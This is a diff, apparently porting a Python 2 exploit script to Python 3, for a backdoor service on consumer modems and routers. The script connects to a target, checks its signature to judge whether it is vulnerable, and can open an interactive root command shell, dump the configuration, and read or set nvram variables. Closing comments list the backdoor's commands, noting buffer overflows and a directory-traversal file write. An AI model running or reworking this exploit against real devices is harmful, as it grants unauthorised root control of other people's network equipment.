@@ -49,8 +49,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(args.timeout)
 try :
 	s.connect((args.ip, args.port))
-except socket.error, v:
-	print "probably not vulnerable (error: %s)"%v
+except socket.error as v:
+	print("probably not vulnerable (error: {0:s})".format(v))
 	sys.exit(0)
 
 s.send("blablablabla")
@@ -66,7 +66,7 @@ if sig == 0x53634D4D :
 elif sig == 0x4D4D6353 :
 	endianness = ">"
 else :
-	print "probably not vulnerable"
+	print("probably not vulnerable")
 	sys.exit(0)
 s.close()
 
@@ -74,41 +74,41 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(args.timeout)
 s.connect((args.ip, args.port))
 if args.is_vuln :
-	print "%s:%d is vulnerable!"%(args.ip, args.port)
+	print("{0:s}:{1:d} is vulnerable!".format(args.ip, args.port))
 elif args.shell :
-	print send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1]
+	print(send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1])
 	while 1 :
-		print send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1]
+		print(send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1])
 elif args.print_conf :
 	conf = send_message(s, endianness, 1)[1]
 	conf = conf.replace("\x00", "\n")
 	conf = conf.replace("\x01", "\n\t")
-	print conf
+	print(conf)
 elif args.get_var is not None :
 	response = send_message(s, endianness, 2, args.get_var)[1].rstrip("\x00")
 	if len(response) == 0 :
-		print "%s is not set"%args.get_var
+		print("{0:s} is not set".format(args.get_var))
 	else :
-		print response
+		print(response)
 elif args.set_var is not None :
 	r, _ = send_message(s, endianness, 3, args.set_var)
 elif args.message is not None :
 	r, response = send_message(s, endianness, args.message, args.payload)
 	if r != 0 :
-		print "Command failed, error code: %08X"%r
+		print("Command failed, error code: {0:08X}".format(r))
 	elif len(response) != 0 :
-		print "Command succeed:"
-		print response.encode("string_escape")
+		print("Command succeed:")
+		print(response.encode("string_escape"))
 	else :
-		print "Command succeed:"
+		print("Command succeed:")
 else :
-	print "%s:%d is vulnerable!"%(args.ip, args.port)
+	print("{0:s}:{1:d} is vulnerable!".format(args.ip, args.port))
 
 s.close()
 
 #commands :
 # 1 : get infos
-# 2 : get var -> possible overflow 
+# 2 : get var -> possible overflow
 # 3 : set var -> buffer overflow
 # 4 : commit nvram (read nvram /dev/mtdblock/3 from /tmp/nvram and check CRC)
 # 5 : bridge mode ?
@@ -126,10 +126,10 @@ s.close()
 #	special commands :
 #		exit, bye, quit -> quit... (set alive to 0)
 #		cd : change directory (a little bit WTF)
-#   other commands :
+# other commands :
 #		integer overflow in stdout handling (?) not exploitable but still ...
 #		buffer overflow (buffer de 0x10000)
-# 		
+#		 
 # 8 : write file (file name in payload, dir : tmp, directory traversa)
 # 9 : print version
 #10 : print modem router ip (nvram_get(lan_ipaddr))
